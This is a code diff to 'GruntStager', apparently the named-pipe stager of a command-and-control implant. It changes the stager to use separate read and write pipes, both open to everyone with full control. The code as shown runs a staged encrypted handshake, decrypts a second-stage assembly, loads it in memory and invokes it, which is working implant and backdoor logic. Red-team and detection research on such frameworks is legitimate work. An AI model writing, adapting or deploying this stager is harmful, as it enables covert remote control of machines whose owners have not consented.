@@ -57,14 +57,19 @@ namespace GruntStager
 
                 string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                 NamedPipeServerStream pipe = null;
+                NamedPipeServerStream pipeWrite = null;
                 string Stage0Response = "";
                 PipeSecurity ps = new PipeSecurity();
                 ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
-                pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
+                // Read pipe
+                pipe = new NamedPipeServerStream(PipeName, PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
+                // WritePipe
+                pipeWrite = new NamedPipeServerStream(PipeName + "w", PipeDirection.Out, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 pipe.WaitForConnection();
+                pipeWrite.WaitForConnection();
                 System.Threading.Thread.Sleep(5000);
                 var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
-                Write(pipe, Stage0Bytes);
+                Write(pipeWrite, Stage0Bytes);
                 Stage0Response = Encoding.UTF8.GetString(Read(pipe));
                 string extracted = Parse(Stage0Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
@@ -95,7 +100,7 @@ namespace GruntStager
 
                 string Stage1Response = "";
                 var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
-                Write(pipe, Stage1Bytes);
+                Write(pipeWrite, Stage1Bytes);
                 Stage1Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage1Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
@@ -123,7 +128,7 @@ namespace GruntStager
 
                 string Stage2Response = "";
                 var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
-                Write(pipe, Stage2Bytes);
+                Write(pipeWrite, Stage2Bytes);
                 Stage2Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage2Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
@@ -136,7 +141,7 @@ namespace GruntStager
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { GUID, SessionKey, pipe, PipeName });
+                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { GUID, SessionKey, pipe, pipeWrite, PipeName });
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message); }
         }
@@ -170,7 +175,7 @@ namespace GruntStager
                 totalReadBytes += readBytes;
             } while (totalReadBytes < size.Length && readBytes != 0);
             int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];
-            
+
             byte[] buffer = new byte[1024];
             using (var ms = new MemoryStream())
             {
